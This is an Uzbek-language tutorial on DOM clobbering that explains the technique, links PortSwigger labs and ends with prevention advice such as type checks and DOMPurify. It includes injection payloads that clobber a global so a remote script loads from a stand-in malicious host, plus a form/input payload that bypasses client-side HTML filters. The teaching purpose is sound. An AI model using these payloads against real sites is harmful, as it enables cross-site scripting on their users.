# Dom clobbering

Biz bugungi bo'limda DOM clobbering nima ekanligi haqida, uning haqiqiy ta'siri qanday ekanligi va uning qanday oldini olish mumkinligi haqida gaplashamiz.

## <mark style="color:yellow;">DOM Clobbering nima ?</mark> <a href="#dom-clobbering-nima" id="dom-clobbering-nima"></a>

DOM clobbering bu sizga HTML ineksiya imkoniyati bilan DOMni manipulation qilish va web sahifaning JavaScript xatti harakatlariga ta'sir etishdir. DOM Clobbering qayerda XSS qilish imkoni bo'lmasa o'sha yerda foydali hisoblanadi, ammo siz faqatgina `id` va `name` attributlarinigina HTML da boshqarishingiz mumkin. Juda keng tarqalgan DOM clobbering shakli bu umuman boshqa elementni global o'zgaruvchi ustidan yozish imkonini berishidir, ya'ni web sayt uni xavfsiz bo'lmagan sharoitda ishlatishida hosil bo'ladi, masalan dynamic script URL yasash holatini keltirishimiz mumkin.

Clobbering atamasi obyektning global o'zgaruvchisi yoki xususiyatini "to'ldirayotganingiz"da va uning o'rniga DOM elementi yoki HTML to'plami bilan qayta yozishingizdan kelib chiqadi. Masalan, siz DOM obyektlaridan boshqa JavaScript obyektlarining ustiga yozish uchun foydalanishingiz va formaning haqiqiy `submit()` funksiyasiga xalaqit berish uchun `submit` kabi xavfli nomlardan foydalanishingiz mumkin.

## <mark style="color:yellow;">Qanday qilib DOM Clobberingni exploit qilish mumkin ?</mark> <a href="#qanday-qilib-dom-clobbering-ni-exploit-qilish-mumkin" id="qanday-qilib-dom-clobbering-ni-exploit-qilish-mumkin"></a>

JavaScript dasturchilari tomonidan ishlatiladigan keng tarqalgan pattern:

```javascript
var someObject = window.someObject || {};
```

Agar siz sahifadagi biror bir HTML ni nazorat qila olsangiz, unda siz `someObject` o'zgaruvchisini DOM node elementi bilan to'ldirishingiz mumkin, quyida kodni keltiramiz:

```html
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```

Ushbu zaif koddan foydalanish uchun siz `someObject` havolasini element bilan yopish uchun quyidagi HTML kodni kiritishingiz mumkin:

```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```

Hozir biz kiritgan bir xil ID va bir xil DOM guruhi endi birlashadi va DOM kollektsiyasini hosil qiladi. DOM clobbering endi biz kiritgan DOM kollektsiyasi bilan uni `someObject` ni to'ldiradi. Tashqi skriptga ishora qiluvchi `someObject` obyektining `url` xususiyatini yopish uchun oxirgi elementda `name` atributidan foydalaniladi.

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [XSSni yoqish uchun DOM clobberingdan foydalanish ≫](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)
{% endhint %}

Yana bir keng tarqalgan usul `form`elementi bilan birga ishlatishdir, masalan DOM clobbering xususiyatlari uchun `input.` Masalan bu, `attributes` xususiyatini bloklash, uni o'z logikalarida ishlatadigan client-side filtrlarini chetlab o'tish imkonini beradi. Filtr `attributes` xususiyatini enumerate qilsada, u aslida hech qanday atributlarni olib tashlamaydi, chunki xususiyat DOM node elementi bilan o'ralgan. Natijada, siz odatda filtrlanadigan zararli atributlarni kiritishingiz mumkin bo'ladi. Masalan, quyidagi ineksiyani ko'rib chiqing:

```html
 <form onclick=alert(1)><input id=attributes>Click me
```

Bunday holda, client-side filtr DOMni kesib o'tadi va whitelistga kiritilgan`form` elementiga duch keladi. Odatda, filtr forma elementining `attributes`xususiyati orqali o‘tadi va blacklistga kiritilgan atributlarni olib tashlaydi. Biroq, `attributes` xususiyati `input` elementi bilan o'ralganligi sababli, filtr o'rniga `input` elementi orqali aylanadi. `input` elementi aniqlanmagan uzunlikka ega bo'lgani uchun filtrning for tsikli uchun shartlar (masalan, `i < element.attributes.length`) bajarilmaydi va filtr shunchaki keyingi elementga o'tadi. Buning natijasida `onclick` hodisasi filtr tomonidan butunlay e'tiborga olinmaydi, bu esa brauzerda `alert()` funksiyasini chaqirish imkonini beradi.

{% hint style="warning" %}
<mark style="color:yellow;">**Lab:**</mark> [HTML filtrlarini bypass qilish uchun DOM Clobbering atributlari ≫](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)
{% endhint %}

## <mark style="color:yellow;">Qanday qilib DOM Clobberingni oldini olish mumkin ?</mark> <a href="#qanday-qilib-dom-clobberingni-oldini-olish-mumkin" id="qanday-qilib-dom-clobberingni-oldini-olish-mumkin"></a>

Oddiy so'zlar bilan aytganda, obyektlar yoki funktsiyalar siz kutganingizdek ekanligiga ishonch hosil qilish uchun tekshiruvlarni amalga oshirish orqali DOM-clobbing hujumlarining oldini olishingiz mumkin. Masalan, DOM node elementining atributlari xususiyati aslida `NamedNodeMap` namunasi ekanligini tekshirishingiz mumkin. Bu xususiyat yopilgan HTML elementi emas, balki atributlar xususiyati ekanligini ta'minlaydi.

Shuningdek, || mantiqiy OR operatori bilan birgalikda global oʻzgaruvchiga havola qiluvchi kod yozmasligingiz kerak, chunki bu DOM clobbering zaifliklariga olib kelishi mumkin.

Xulosa qilib aytganda:

* Har bir obyektni DOM node elementi emasligini tekshiring
* Yomon kod patternlaridan foydalanmang. Global o'zgaruvchilar ishlatayotganda OR operatoridan iloji boricha foydalanmang
* Yaxshi ishlab chiqilgan kutubxonadan foydalaning misol uchun [<mark style="color:yellow;">**`DOMPurify`**</mark>](https://github.com/cure53/DOMPurify) kutubxonasidan, u DOM clobbering xujumini oldini olishga yordam beradi.
